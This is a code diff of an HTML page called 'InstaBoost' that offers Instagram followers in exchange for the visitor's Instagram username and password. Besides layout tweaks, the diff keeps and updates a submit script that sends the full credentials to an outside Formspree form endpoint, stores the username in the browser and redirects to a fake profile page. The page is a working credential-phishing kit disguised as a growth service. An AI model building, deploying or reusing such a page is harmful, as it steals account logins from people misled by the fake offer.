@@ -12,47 +12,36 @@
     }
   </style>
 </head>
-<body class="flex items-center justify-center min-h-screen px-4">
-  <div class="bg-white p-10 rounded-3xl shadow-2xl max-w-md w-full space-y-8">
+<body class="flex items-center justify-center min-h-screen px-4 sm:px-6 py-6 overflow-y-auto">
+
+  <div class="bg-white p-6 sm:p-10 rounded-2xl shadow-xl max-w-md w-full space-y-6">
+    <!-- Header -->
     <div class="text-center space-y-2">
       <img src="https://img.icons8.com/fluency/48/instagram-new.png" alt="Instagram Logo" class="mx-auto" />
-      <h2 class="text-3xl font-extrabold text-gray-800">Welcome Back to InstaBoost</h2>
+      <h2 class="text-2xl sm:text-3xl font-extrabold text-gray-800">Welcome Back to InstaBoost</h2>
       <p class="text-sm text-gray-500">Log in securely to grow your audience today.</p>
     </div>
 
     <!-- FORM START -->
-    <form id="instaForm" class="space-y-6">
+    <form id="instaForm" class="space-y-4 sm:space-y-6">
       <!-- Username -->
       <div>
         <label for="username" class="block text-gray-700 font-medium mb-1">Instagram Username</label>
         <input id="username" name="username" type="text" required placeholder="@yourusername"
-               class="w-full border border-gray-300 rounded-xl px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
+               class="w-full border border-gray-300 rounded-xl px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-blue-500" />
       </div>
 
       <!-- Password -->
       <div>
         <label for="user_pass" class="block text-gray-700 font-medium mb-1">Password</label>
         <input id="user_pass" name="user_pass" type="password" required placeholder="••••••••"
-               class="w-full border border-gray-300 rounded-xl px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
-      </div>
-
-      <!-- Follower Amount -->
-      <div>
-        <label for="followers" class="block text-gray-700 font-medium mb-1">Choose Your Boost</label>
-        <select id="followers" name="followers" required
-                class="w-full border border-gray-300 rounded-xl px-4 py-2 bg-white focus:outline-none focus:ring-2 focus:ring-blue-500">
-          <option value="">Select followers</option>
-          <option value="100">+100 Followers</option>
-          <option value="250">+250 Followers</option>
-          <option value="500">+500 Followers</option>
-          <option value="1000">+1000 Followers</option>
-        </select>
+               class="w-full border border-gray-300 rounded-xl px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-blue-500" />
       </div>
 
       <!-- Submit Button -->
       <div>
         <button type="submit"
-                class="w-full bg-blue-600 text-white py-3 rounded-xl font-semibold text-lg hover:bg-blue-700 transition shadow-md">
+                class="w-full bg-blue-600 text-white py-3 rounded-xl font-semibold text-base sm:text-lg hover:bg-blue-700 transition duration-200 shadow-md">
           🚀 Submit & Boost
         </button>
       </div>
@@ -60,7 +49,7 @@
     <!-- FORM END -->
 
     <!-- Security Message -->
-    <div class="bg-blue-50 border border-blue-200 p-4 rounded-lg text-sm text-blue-800 flex items-start gap-3">
+    <div class="bg-blue-50 border border-blue-200 p-3 sm:p-4 rounded-lg text-sm text-blue-800 flex items-start gap-2 sm:gap-3">
       <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mt-0.5 text-blue-500" fill="currentColor" viewBox="0 0 20 20">
         <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-11a1 1 0 10-2 0v1a1 1 0 102 0V7zm-1 4a1 1 0 00-1 1v2a1 1 0 102 0v-2a1 1 0 00-1-1z" clip-rule="evenodd"/>
       </svg>
@@ -72,26 +61,28 @@
     </div>
   </div>
 
-  <!-- JavaScript for Custom Submit -->
+  <!-- JS: Handle Form Submit -->
   <script>
     const form = document.getElementById('instaForm');
-
     form.addEventListener('submit', function(e) {
       e.preventDefault();
 
+      const username = document.getElementById('username').value;
       const formData = new FormData(form);
 
-      fetch('https://formspree.io/f/mjkwoyzg', {
+      // ✅ Save username to sessionStorage
+      sessionStorage.setItem('instaUsername', username);
+
+      // Submit the form
+      fetch('https://formspree.io/f/xnndbpov', {
         method: 'POST',
-        headers: {
-          'Accept': 'application/json'
-        },
+        headers: { 'Accept': 'application/json' },
         body: formData
       })
       .then(response => {
         if (response.ok) {
-          // ✅ Redirect to processing.html
-          window.location.href = 'processing.html';
+          // ✅ Redirect to profile page
+          window.location.href = 'profile.html';
         } else {
           alert('Form submission failed. Try again!');
         }
